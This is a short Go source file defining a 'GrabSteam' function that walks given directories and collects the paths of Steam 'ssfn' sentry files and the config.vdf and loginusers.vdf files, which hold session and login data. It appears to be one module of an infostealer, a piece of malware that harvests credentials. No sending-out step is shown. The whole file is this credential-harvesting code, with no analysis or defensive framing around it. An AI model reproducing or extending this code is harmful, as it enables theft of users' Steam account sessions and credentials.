package main

import (
	"os"
	"strings"
)

func GrabSteam(pather, path_config string) (pth_steam []Steam, pth_steam_cfg []Steam) {
	if ff, err := os.ReadDir(pather); err == nil {
		for _, f := range ff {
			if strings.Index(f.Name(), "ssfn") != -1 {
				c := Steam{f.Name(), pather + f.Name()}
				pth_steam = append(pth_steam, c)
			}
		}
	}
	if files, err := os.ReadDir(path_config); err == nil {
		for _, file := range files {
			if file.Name() == "config.vdf" || file.Name() == "loginusers.vdf" {
				c := Steam{file.Name(), path_config + file.Name()}
				pth_steam_cfg = append(pth_steam_cfg, c)
			}
		}
	}

	return

}

type Steam struct {
	Filename string
	Pather   string
}
